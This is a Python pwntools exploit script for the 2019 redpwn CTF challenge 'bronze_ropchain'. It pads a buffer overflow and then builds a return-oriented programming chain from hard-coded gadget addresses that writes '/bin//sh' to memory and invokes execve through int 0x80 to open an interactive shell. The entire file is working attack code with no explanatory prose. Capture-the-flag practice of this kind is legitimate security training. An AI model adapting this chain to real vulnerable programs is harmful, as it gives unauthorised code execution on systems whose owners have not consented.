from pwn import *
from struct import *

ip = "chall.2019.redpwn.net"
port = 4004
# r = remote(ip,port)

elf = 'bronze_ropchain' 
r = process("./"+elf)
offset = 28

p = 'a' * offset

p += pack('<I', 0x0806ef2b)  # pop edx ; ret
p += '/bin' #edx = /bin
p += pack('<I', 0x08067eef)  # nop ; mov eax, edx ; ret
#eax = /bin
p += pack('<I', 0x0806ef2b)  # pop edx ; ret
p += pack('<I', 0x080da060) #datasec edx = datasec
p += pack('<I', 0x08056fe5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806ef2b)  # pop edx ; ret
p += '//sh' #edx = //sh
p += pack('<I', 0x08067eef)  # nop ; mov eax, edx ; ret
#eax = //sh
p += pack('<I', 0x0806ef2b)  # pop edx ; ret
p += pack('<I', 0x080da064) #datasec edx = datasec +4
p += pack('<I', 0x08056fe5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806ef2b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080565a0) # xor eax, eax ; ret
p += pack('<I', 0x08056fe5) # mov dword ptr [edx], eax ; ret

# ebx = /bin//sh
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data

# edx = 0
p += pack('<I', 0x0806ef2b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8

#eax = 11 	sys_execve
p += pack('<I', 0x080565a0) # xor eax, eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
# ecx = 0
p += pack('<I', 0x0806f2f1)   #xor ecx, ecx ; int 0x80

raw_input("aa")
r.sendline(p)
r.interactive()


#b *0x80488e8